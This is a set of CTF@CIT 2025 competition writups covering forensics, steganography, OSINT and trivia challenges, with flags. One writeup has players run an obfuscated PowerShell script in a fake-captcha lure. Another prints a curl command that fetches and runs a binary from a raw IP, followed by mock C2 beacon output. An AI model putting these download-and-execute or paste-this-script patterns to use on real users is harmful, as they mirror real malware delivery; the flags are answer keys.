<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-ctf-cit
description: CTF writeups and security challenges by ctf-cit.
---

# Writeups by ctf-cit

Source repository: `/repos/ctf-cit`

## Repository Index

- CIT-CTF-2025/readme.md
- CIT-CTF-2025/steg/i_am_steve/i_am_steve.md
- CIT-CTF-2025/steg/not_a_sigma/not_a_sigma.md
- CIT-CTF-2025/steg/queens_gambit/queens_gambit.md
- CIT-CTF-2025/steg/sw0906/sw0906.md
- CIT-CTF-2025/osint/apizza/apizza.md
- CIT-CTF-2025/osint/remember_the_welding/remember_the_welding.md
- CIT-CTF-2025/misc/mongolian_throat_singing/mongolian.md
- CIT-CTF-2025/misc/select_all_squares/select_all_squares.md
- CIT-CTF-2025/forensics/bits_n_pieces/bits_n_pieces.md
- CIT-CTF-2025/forensics/brainrot_quiz/brainrot_quiz.md
- CIT-CTF-2025/forensics/true_ctf_love/true_ctf_love.md
- CIT-CTF-2025/forensics/we_lost_the_flag/we_lost_the_flag.md

## Writeup Content


### File: CIT-CTF-2025/forensics/bits_n_pieces/bits_n_pieces.md

# Bits 'n Pieces

Somewhere in these digital fragments lies what you've been searching for your entire lifetime, or really just this weekend ;)

**SHA256:** `4b52731748484ecaa9ba3a5c8ec455675c78d0e3f8ac349a2a54e5e1f0cbb2a1`

## Solution

The challenge-related file is bitmap cache from a Remote Desktop session on Windows. Running a tool such as [BMC-tools](https://github.com/ANSSI-FR/bmc-tools) will output the `.bmp` files from the cache. 

From there, using a tool such as [RDPieces](https://github.com/brimorlabs/rdpieces) you can piece the images together like a puzzle and get the flag from the command prompt that was open in the system.

Alternatively, by just scrolling through all the `.bmp` files you can get an idea of what the text is displaying and piece the flag together by simply browsing the image previews in the output folder.

## Flag

> `CIT{c4ch3_m3_if_y0u_c4n}`


### File: CIT-CTF-2025/forensics/brainrot_quiz/brainrot_quiz.md

# Brainrot Quiz!

Bombardiro Crocodillo or....? You find out...

**SHA256:** `e5f5d4e97506233266904e460fdfea4fc3ce2bf1542dc122283835c545fb8516`

## Solution

The flag is hidden in the 11th packet in the pcap file, Base64 encoded as `Q0lUe3RyNGw0bDNyMF90cjRsNGw0fQ=`

Once decoded, you get the flag!

## Flag
 
> `CIT{tr4l4l3r0_tr4l4l4}`


### File: CIT-CTF-2025/forensics/true_ctf_love/true_ctf_love.md

# True CTF Love

I got this strange email from another CTF participant not too long ago. I am just not sure what they mean by this...

Do you love CTFs as much as they do?

**SHA256:** `07cb654ce87444f158a52228848eb4eb501738913dfca44a2f227fb73ee9ed4b`

### Solution

Upon opening the challenge `.eml` file, the flag is hidden in the DKIM-Signature portion of the email header, Base64 encoded to match the actual DKIM-Signature of the email.

```
b=V293LCB3aGF0IGEgYmVhdXRpZnVsIGxpdHRsZSBwb2VtLiBJIGFsbW9zdCBzaGVkI
	 GEgdGVhciByZWFkaW5nIHRoYXQuIEhvcGVmdWxseSB5b3UgbGVhcm5lZCBtb3JlIGFi
	 b3V0IGVtYWlsIGhlYWRlcnMuIEJ1dCBzZXJpb3VzbHksIGl0IGdldHMgbWUgd29uZGV
	 yaW5nLi4uIGRvIHlvdSBsb3ZlIENURnMgYXMgbXVjaCBhcyB0aGV5IGRvPwoKQ0lUe2
	 lfbDB2M19jdGYkX3QwMH0=
```

Once it is Base64 decoded, you get this:

```
Wow, what a beautiful little poem. I almost shed a tear reading that. Hopefully you learned more about email headers. But seriously, it gets me wondering... do you love CTFs as much as they do?

CIT{i_l0v3_ctf$_t00}
```

## Flag

> `CIT{i_l0v3_ctf$_t00}`


### File: CIT-CTF-2025/forensics/we_lost_the_flag/we_lost_the_flag.md

# We lost the flag

Sorry everyone, we unfortunately lost the flag for this challenge.

**SHA256:** `d1058ed414e6e45f4d2c7cc41baf73b3778a80be18cdf2d6470348c72ab01dfd`

## Solution

Players are given a corrupted file, `lost.png`, however, upon inspecting the magic bytes/header of the file with something like `xxd lost.png | head -n 1` you will see that the magic bytes are not for a PNG, but rather a JPEG. 

To add some flare to this, the magic bytes are swapped further. You must correct the magic bytes to be the same as a JPEG file header.

> `FF D8 FF E0 00 10 4A 46 49 46 00 01`

Finally, you must change the file extension to `.jpg` to reveal the flag in the image.

## Flag

> `CIT{us1ng_m4g1c_1t_s33m5}`


### File: CIT-CTF-2025/misc/mongolian_throat_singing/mongolian.md

# Mongolian throat singing

Send us a clip of you singing your heart out to The Hu for the flag!

Just kidding, open that terminal and get to work.

`nc 23.179.17.40 5393`

## Solution

The goal here was to answer each question without getting an answer wrong as your connection would be closed and you would have to start over from scratch.

```
> What is the official currency of Mongolia?  
- Tugrug  
- Tugrik  

> What is Mongolia's primary export commodity?  
- Coal  

> What is the second-largest export product of Mongolia after coal?  
- Copper  

> In what year did Mongolia join the World Trade Organization (WTO)?  
- 1997  

> Which animal is the primary source of cashmere in Mongolia?  
- Goats  
- Cashmere Goats  

> What is the name of the wild camel species found in Mongolia?  
- Wild Bactrian Camels  
- Bactrian Camels  
- Bactrian  
- Wild Bactrian  
- Wild Bactrian Camels  

> What animal is used extensively by Mongolian herders for milk, wool, and meat?  
- Yak  
- Yaks  

> Which species of wild goat in Mongolia is famous for its badass horns?  
- Markhor  
- Markhor Goat  
- The Markhor  
- The Markhor Goat  

> Who was the founder of the Mongol Empire?  
- Genghis Khan  

> In which year did the Mongol Empire officially split into four khanates?  
- 1260  

> Which Mongol leader was known for his conquest of the Song Dynasty in China?  
- Kublai Khan  

> Which famous traveler from Venice visited the Mongol Empire during the reign of Kublai Khan?  
- Marco Polo  

> Which famous Mongol general and grandson of Genghis Khan is known for leading the conquest of the Ilkhanate in Persia?  
- Hulegu Khan  
- Hulegu  
- Hulagu Khan  
- Hulagu  

> What is the name of the book that Marco Polo wrote about his travels to the Mongol Empire?  
- The Travels of Marco Polo  

> Which Mongol leader attempted to invade Japan twice, in 1274 and 1281, but was thwarted by powerful typhoons, known as the 'Kamikaze' winds?  
- Kublai Khan  

> Which famous Mongol khanate ruled over much of Russia, Ukraine, and parts of Central Asia during the 13th and 14th centuries?  
- Golden Horde  
- The Golden Horde  

> What important Mongol battle occurred in 1241 that delayed the Mongol invasion of Europe?  
- The Battle of Mohi  

> Which population migration is responsible for bringing the majority of Y-chromosomal lineages in South Kazakhstan?  
- Niru'un Mongols  
- Niru'un  

> Which group do the majority of Kazakhs from South Kazakhstan belong to?  
- Senior Zhuz  
```

Admittedly, this challenge had some issues with how specific answers had to be originally, so it was relaunched to be a bit more forgiving when it came to plurals and we had some fallbacks in place for answers like that. Apologies for that mishap again!

## Flag

> `CIT{w0lf_t0t3m}`


### File: CIT-CTF-2025/misc/select_all_squares/select_all_squares.md

# Select all squares that contain uhh...

These captchas seem to get more difficult day by day...

> *If the challenge site does not seem to load at first, please try it through a private window or another browser before contacting CTF support*

## Solution

Simply follow the instructions on the captcha page.

You must first open PowerShell and then run the obfuscated script in your PowerShell window!

The flag is output to `C:\Users\<user>\AppData\Local\Temp\*\flag.txt`


**Plaintext Script:**

```
$randomDir = Join-Path -Path $env:TEMP -ChildPath ([guid]::NewGuid().ToString()); New-Item -Path $randomDir -ItemType Directory | Out-Null; Set-Content -Path (Join-Path -Path $randomDir -ChildPath "flag.txt") -Value "CIT{th1s_a1nt_m4lw4r3_d0nt_w0rry}"; Write-Host "`n`nDefinitely don't run random PowerShell you find on the internet.. But anyways, the flag is somewhere on your system so go find it!" 
```

**Obfuscated Script:**

```
sEt-varIabLE IqBofD (  "  ) )43]rAhC[,)18]rAhC[+77]rAhC[+28]rAhC[(eCaLpeRc-93]rAhC[,'ukz'eCaLpeRc- 63]rAhC[,'akF'eCaLpeRc-)') uk'+'zukz'+'NIoJ-]) hTGNEl.jQZakF ( -.. 1 -'+'[jQZakF ()ukzxukz+'+']03[EmoHsPakF+]4[eMohspakF (. ; )  QMR iex( (ukz & ( r'+'A9SHeLLiD'+'[1]+rA9sheLLId[13]+IiDXIiD)( (u'+'kz+ukz((lbH{15}{11}{10}{1}ukz+ukz{22}{35}{24}{21ukz+'+'ukz}{4}{34}{8}{9}{16}{27}{5}{38}{33}{23}{14}{20}{6}{26}{13}{17}{7}{28}{ukz+ukz37}{31}{29}{2}{32}{ukz+ukz1'+'2ukz+ukz}{36}{0}ukz+ukz{19}{3}{18}{25}{30}lbH-fIiDriDmoIiD,IiD3]RahC[,yzpC1HyzpeCAlp'+'eukz+ukzr-93]Rah'+'C[,IiD,IiD]diug[(yzIiD,IiD((( )yzpxyzp+]43[EMohSPA'+'ROIiD,IiDhC[IiD,IiDzpos si gayzp+yzIiD,IiDukz+ukzyzpnlQsnyzp+yz'+'plyzp+yzpQukz+ukzsyzp+yzpPyzp+yzp81 tsoH-eukz+ukztiyzp+yzprW ;Pyzp+yzp81yzp+yukz+ukzzp}yryzp+yzpr0wukz+ukz_tn'+'0d_3r4yzp+'+'yzpwl4m_t'+'n1yzp+yzpa_s1htIiD,IiDyyzukz+ukzp+yzpr'+'otceriD'+' eyzp+yzppy'+'Tmyzukz+u'+'kzp+yzpetyzp'+'+'+'yzpI- riDyzp+yzpIiD,IiD[(eCAlper-)yzpukz+ukzP81!ti ukz+ukzd'+'IiD,IiDyzp+yzpnifyzp+yzukz+ukzp ogyzIiD,IiD )6I'+'iD,Iiukz+ukz'+'DIABLE '+'n7A1u (ask )IiD,IiDzp+yzpaPdlihC- yzp+ukz+ukzyzpPMET:vneIiDukz+ukz,IiDP81ukz+ukztyzp+yzpxt.galfP8yzp+yzp1 yzp+yzphtyzp+yzpaPdlihukz+ukzC- r'+'i'+'Dmodnay'+'zp+yzprC1H htaP- yzp+yzp'+'hukz+ukztayzp+ukz+ukzyzpP-nioJ( h'+'taP- tnyzp+yzpetnoC-tyzp+yzukz+ukzpeS yzp+yzp;'+'lyzp+yzpluyzp+yzpNIiD,I'+'iD llehSrewoIiD,IiDSeT-vARIiD,IiDp+yzp os metsys ruo'+'y no eryzp+IiD,Ii'+'D-tuO vyzp+yzpVQ yzp+uk'+'z+ukzyzpIiD,IiD+]4[EMOhspu'+'kz+uk'+'zARO ( . ask ) ; -join ( VAriAblEI'+'iD,IiDyzp+yzpdnarC1'+'yzp+yzpHyukz+ukzzpIiD,IiDyzp+yzpP moyukz+ukzzp+yzpdnar nyzp+yzpur yzp+yzpttyzp+yz'+'pNHnodukz+ukz yzp+'+'yzpyletinifeDyzp+IiD,IiD]RahC[,)811]u'+'kz+ukzRahC[+68]R'+'ahC[+18'+']RahC['+'( eCAlper-43]RahC[,'+'yzpP81yzp  eCAlPeR'+'ukz+ukzc-69]'+'R'+'aIiD,IiD)611]Raukz+ukzhC[+87]IiD,IiDzp+yzp uoyIiD,IiDhC['+'+27]'+'RahC[(eCAlPeRc- ukz+ukz ukz+ukz421IiD,ukz+ukzIi'+'D  N'+'7a1U -vaLUEo  )[ -1.ukz+ukz. -( ( VAr'+'iAblE  N7a1U IiD,IiD{TIC'+'P8yzp+yukz+u'+'kzzp1'+' eulaV-yzukz+ukzp+yzp )IiD,IiDyzpehweukz+ukzmyzp'+'+yIiD,IiDmodnayzp+yzp'+'ryzp+yzpCyzp+yzp1H hyzp+yzptaP-yzp+yzp myzukz+ukzp+yzpe'+'tI-yzp+'+'yzpweN ;))(gnyzp+yukz+ukzzpirtSoT.)('+'diuukz+ukzGwyzp+yzIiD,IiD:ukz+ukzyzp+yzukz+ukzpIiD,IiD-vaLUEo  ).LEngtH )]olTiexIiD,IiDN:IiD,Iiukz+ukzDp'+'+yzp h'+'tyIuk'+'z+ukziD,ukz+ukzIiDno dnifyukz+ukzIiD,IiD,)801]RahC[+18]RahC[+511]RahCIiD,Iukz+u'+'kziDRaIiD,IiDC1H htaP- htaP-nioyzp+yzpJ = Iukz+ukziD,IiDpeukz+ukzIiD,IiDpukz+ukzlf eht ,syawyyzp+yzpnukz+ukza tu'+'B yzp+yzp.yzp+yzp.tenretni eht IiD)) -REplAceIiDolTIiD,['+'CHaR]124  -REplAceIiDyzpIiD,[CHaR]39  -CREplaCE IiDAROIi'+'D,[ukz+ukzCHaR]36-CREplaCE ([CHaR]97+[CHaR]115+[CH'+'aR]107),[CHaR]3'+'4) '+')ukz).rePLACE(([cHar]73+[cHar]105+[cHar]68),[StRiNg][cHar]39).rePL'+'ACE(([cHar]114+[cHar]65+[cHar]57),[StRiNg]'+'[cHar]36).rePLACE(([cHar]108+[cHar]98+[cHar]72),[StRiNg][cHar]34) '+') QMR(  jQZ  VS'(( ()'X'+]31[DILlehs$+]1[DILLeHS$ (&"  ) ; & ( $pshomE[4]+$PShoME[30]+'x')(-jOiN$iQboFd[ -1 ..-( $iQboFd.lenGTH ) ] )
```
## Flag

> `CIT{th1s_a1nt_m4lw4r3_d0nt_w0rry}`


### File: CIT-CTF-2025/osint/apizza/apizza.md

# Apizza

Everyone always talks about how good New Haven style pizza is. It's the kind of pizza you simply feel in your bones afterwards.

**SHA256:** `e7ea064509425e93d1773518d6a23143fe0fd00b5e8b4103e6da884e098a358d`

## Solution

The picture is a Google Earth screenshot of Frank Pepe's Pizza in New Haven. However, running `exiftool` against the image reveals a set of coordinates that lead to the Skull and Bones secret society building in New Haven which was the flag. Note that the flag had a few acceptable formats which were not listed below.

```
GPS Latitude                    : 41 deg 18' 29.88" N
GPS Longitude                   : 72 deg 55' 48.00" W
GPS Position                    : 41 deg 18' 29.88" N, 72 deg 55' 48.00" W
```

## Flag

> `CIT{skull_and_bones}`




### File: CIT-CTF-2025/osint/remember_the_welding/remember_the_welding.md

# Remember the welding challenge from last year? 

I got a job at this oil rig doing some pipe welding. I need a new welding helmet and I think I found a good one..

There is someone selling one on the 'ole Ebay just like this, but I'm going to see if the 'ole feller will let me pick it up in-person. While I'm out there.. maybe I'll grab a bite to eat. My per diem at the new job allows me to fine dine, so maybe I'll check the 'ole Michelin Guide and see what is going on in the area with some Bib Gourmands..

Now that I'm looking... I'm in the mood for a really good Chicken Tikka. Any ideas on where I can find one a bit West from the seller's area?

**Flag format will be the restaurant's name wrapped in `CIT{}`**

## Solution

The challenge image was an absolutely bombshell welding mask with a beautiful graphic of the Joker and a roulette wheel.

The challenge description mentions Ebay which is a big hint on where to exactly look deeper. Reverse image searching this challenge file, you will come across a few similar masks.

The specific Ebay listing was [this](https://www.ebay.com/itm/134801016021?_skw=welding%20helmet%20joker&itmmeta=01JSVZ65HZ99PREPWDWS326QB3&itmprp=enc%3AAQAKAAAA8FkggFvd1GGDu0w3yXCmi1fF0rdij2wF7QOpJEQO5eY%2Brf6q2baoMEh941YT%2FRXg5FJ3rfwSvbGQh2Hidb4saVeSi6NbxyCcqoIQNGKx75C%2FIdQa0LbmX78Roi%2FIgVN1OFwjy0UrW5XeWwWidmH9W2qCGWipVPr0dNMG40CTsO74VYd4xiNZ9XUkSIXIMVoqOUScXL4J5u7ae6159IP83spLaCUOFAClHjBl1wh4L7luPZ6MXfr%2BFqSrNh9VLg3WZ4Wn0VqisB%2FnH%2BZ8OqTBkD3impSLBpLQSR9tUh7y%2BQC2BCX4Rn8CzfK8S31z6JMgew%3D%3D%7Ctkp%3ABk9SR5rZmP_OZQ&LH_BIN=1) one here.

Looking at the details of the listing, you can see the seller is based in Ontario, California. The challenge mentions the Michelin Guide, Indian food, and Bib Gourmands, which are cheaper alternatives to Michelin starred restaurants. Looking at guide for Bib Gourmands near Ontario, you will come across an Indian restaurant named **Manohar's Delhi Palace** which is the flag.


## Flag

> `CIT{Manohar's Delhi Palace}`



### File: CIT-CTF-2025/readme.md

# CTF@CIT 2025 Writeups

We want to thank everyone who participated in CTF@CIT this year! We appreciate you spending the weekend grinding out the challenges and having fun with us. Thank you all for the feedback this year and we hope you all had a great time and we look forward to hosting this again in 2026! See you next year :)

This year, we had challenges in the following categories:

- [Crypto](./crypto)
- [Forensics](./forensics)
- [Reverse Engineering](./reverse)
- [Steganography](./steg)
- [Misc](./misc)
- [OSINT](./osint)
- [Web](./web)


Thank you to our wonderful sponsors who provided prizes to the CTF and help keep this going each year:

- Hex-Rays
- OffSec
- TCM Security
- Malcore
- Electronic Frontier Foundation (EFF)
- Binary Ninja
- Black Hills Information Security
- IZT Cloud

And lastly, big shoutout to the volunteers who helped create challenges and pull this off in a short time this year!

ggwp


### File: CIT-CTF-2025/steg/i_am_steve/i_am_steve.md

# I AM Steve

You were supposed to be a hero, Brian!

SHA256: `01b3dbe5d8801adf27a9bb779d85ef4c8881905544642fbdbdd41e54e4d0ae5e`

## Solution

Use steghide or a similar tool get the following string from the challenge file: `VEhJU19pc19hX2NyYWZ0aW5nX3RhYmxl`. Then decode the string from Base64 to get the flag.

## Flag

> `CIT{THIS_is_a_crafting_table}`




### File: CIT-CTF-2025/steg/not_a_sigma/not_a_sigma.md

# Sorry, you're NOT a sigma!

The lion says solve this challenge. You seem to have a good **track** record at doing so.

**SHA256:** `66591540e5dd8e925128513d1ca0810118350c822429e4e8c1d1a98b7d8924f3`


## Solution

By loading the `.mp4` file into a program such as Audacity, you can see there are two audio tracks in the file, however, you only hear one when viewing the file using a media player. When choosing the second audio track, you can then view the spectrogram for the hidden distorted audio which visually contains the following command within the spectrogram:

```
curl -s http://23.179.17.40:6969/roar /tmp/roar && chmod +x /tmp/roar && /tmp/roar
```

The above command downloads a binary and then executes it on your system which should output something similar into your terminal over the span of around 10 seconds:

```
[*] Initializing beacon...
[*] Beacon attempt 1: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 2: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 3: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 4: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 5: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 6: phoning home...
[-] No response from C2 server.
[*] Beacon attempt 7: phoning home...
[+] Beacon successfully reached C2 on attempt 7.
[*] Downloading payload...
[*] Decrypting response...
[+] Flag received:
CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}
```

No, it is not actually a C2 beacon.

## Flag

> `CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}`


### File: CIT-CTF-2025/steg/queens_gambit/queens_gambit.md

# Queen's Gambit

Like the actual Queen, not the band

SHA1: `819b1c887ba3699ca5cc90b64d8dc8f8712d6bba`

## Solution

Use steghide or a similar tool such as [this one](https://stylesuxx.github.io/steganography/) to extract sets of chess coordinates.

Trace the order of these coordinates onto a chess board and you will see they spell out "PWN" which is the flag

## Flag

> `CIT{PWN}`



### File: CIT-CTF-2025/steg/sw0906/sw0906.md

# sw0906

Deceive you, the bytes do. Look deeper, you must.

**SHA256:** `b3ca30e35e55e20406c278eb5accdb78ef028b001837f2bfaadda5760943f7f3`

## Solution

For this challenge, if you run `exiftool yoda` you will see the following warning which tells you the file is a JPEG:

```
Processing JPEG-like data after unknown 1-byte header
```

Using a tool like `ghex` you can also see the endianness of the file is swapped. From there, you can either write a script, use CyberChef to render the image, or use a quick one-liner command.

To solve this challenge using CyberChef, use the following recipes in this exact order:

> **To Hex > Swap Endianness > Render Image**

Upon doing so you will see the image of LEGO Yoda which contains the flag.

To Solve using a one-liner command:

> `hexdump -v -e '1/4 "%08x"' -e '"\n"' yoda | xxd -r -p > yoda.jpg`

Once you open the outputted image, you will see the flag

## Flag

`CIT{h1dd3n_n0_m0r3_1t_i5}`


